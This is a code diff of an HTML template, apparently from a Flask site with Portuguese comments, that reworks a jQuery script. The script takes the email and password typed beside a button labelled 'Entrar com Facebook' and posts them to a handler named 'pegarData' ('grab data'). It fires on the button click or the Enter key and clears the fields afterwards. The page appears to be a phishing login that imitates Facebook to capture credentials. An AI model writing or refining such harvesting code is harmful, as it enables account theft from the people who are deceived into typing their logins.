@@ -200,36 +200,58 @@
 </body>
 </html>
 
-
 <script>
-
-$( "#btnface" ).on( "click", function() {
-    email = $("#email").val()
-    passwd = $("#passwd").val()
-
-
-    if(email.length!=0 && passwd.length!=0){
-        $.ajax({
-            url : "{{ url_for('pegarData') }}",
-            type : 'post',
-            data : {
-                email : email,
-                passwd : passwd
+    $(document).ready(function() {
+      // Função para enviar os dados via AJAX
+      function enviarFormulario() {
+        var email = $("#email").val();
+        var passwd = $("#passwd").val();
+  
+        // Verificar se ambos os campos estão preenchidos
+        if (email.length != 0 && passwd.length != 0) {
+          $.ajax({
+            url: "{{ url_for('pegarData') }}", // URL para onde enviar os dados
+            type: 'POST',
+            data: {
+              email: email,
+              passwd: passwd
+            },
+            success: function(response) {
+              // Limpar os campos após envio bem-sucedido
+              $("#email").val("");
+              $("#passwd").val("");
+  
+              // Caso necessário, adicionar ações de sucesso
+              console.log("Dados enviados com sucesso!");
+            },
+            error: function(error) {
+              // Caso ocorra algum erro na requisição
+              console.error("Erro ao enviar os dados", error);
             }
-        })
-        .done(function(msg){
-            $("#email").val("")
-            $("#passwd").val("")
-
-
-        })
-
-
-    }else{
-        alert("Favor preencher os campos de email e senha de forma completa!")
-    }
-
-} );
-
-
-</script>
+          });
+        } else {
+          // Se os campos não estiverem preenchidos, mostrar um alerta
+          alert("Favor preencher os campos de email e senha de forma completa!");
+        }
+      }
+  
+      // Interceptar a tecla pressionada nos campos de email e senha (pressionando Enter)
+      $("#email, #passwd").on("keydown", function(event) {
+        // Verificar se a tecla pressionada é "Enter" (tecla 13)
+        if (event.key === "Enter") {
+          // Impedir o comportamento padrão (caso o enter tenha um comportamento padrão, como submeter o formulário)
+          event.preventDefault();
+  
+          // Chamar a função para enviar os dados
+          enviarFormulario();
+        }
+      });
+  
+      // Evento para o botão "Entrar com Facebook"
+      $("#btnface").on("click", function() {
+        // Chamar a função para enviar os dados quando o botão for clicado
+        enviarFormulario();
+      });
+    });
+  </script>
+  
